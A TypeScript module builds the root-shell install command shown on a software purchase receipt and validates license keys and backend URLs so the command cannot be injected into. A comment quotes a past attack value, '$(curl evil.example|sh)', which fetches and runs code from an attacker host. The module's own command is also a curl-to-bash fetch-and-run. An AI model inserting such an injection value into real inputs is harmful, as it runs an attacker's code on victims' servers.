import { site } from "./site";

/**
 * The one-line installer a buyer pastes into a root shell on their server.
 *
 * WHY THE KEY IS CHECKED SO STRICTLY. The purchase receipt used to build this
 * command from the `key` in its own address, so a link such as
 * /buy/success?key=$(curl evil.example|sh) printed a command that ran the
 * attacker's code on the buyer's server the moment they pasted it. A key is
 * now accepted only in the exact form the backend issues it: a UUID as Go's
 * uuid.UUID.String() prints it (CreateOneCampLicense, VerifyPayment), lowercase
 * hex and hyphens in fixed places. Nothing in that alphabet means anything to
 * the shell, and anything else gets no command at all.
 *
 * Strict rather than forgiving: no trimming, no uppercase, no braces or
 * urn:uuid: prefix (forms the backend's uuid.Parse would take). The key comes
 * from our own API, which never sends those, so a value in any other shape did
 * not come from us.
 */
const LICENSE_KEY = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;

/** The key if it is one the backend could have issued, else null. */
export function parseLicenseKey(raw: unknown): string | null {
  return typeof raw === "string" && LICENSE_KEY.test(raw) ? raw : null;
}

/**
 * A backend address the command may carry: a plain http(s) origin with an
 * optional path, so no quote, space or `$` can come from configuration either.
 */
const SAFE_BASE = /^https?:\/\/[a-z0-9.-]+(:\d{1,5})?(\/[a-z0-9._~-]+)*$/i;

/**
 * The install command for a licence key, worded exactly as the backend words it
 * in emails and on the account page (portalBusiness.go installCommand), or null
 * when the key or the base address is not safe to put in a shell command.
 */
export function installCommand(key: string, backendUrl: string = site.backendUrl): string | null {
  const k = parseLicenseKey(key);
  if (!k || !SAFE_BASE.test(backendUrl)) return null;
  return `/bin/bash -c "$(curl -fsSL ${backendUrl}/onecamp/download/${k})"`;
}
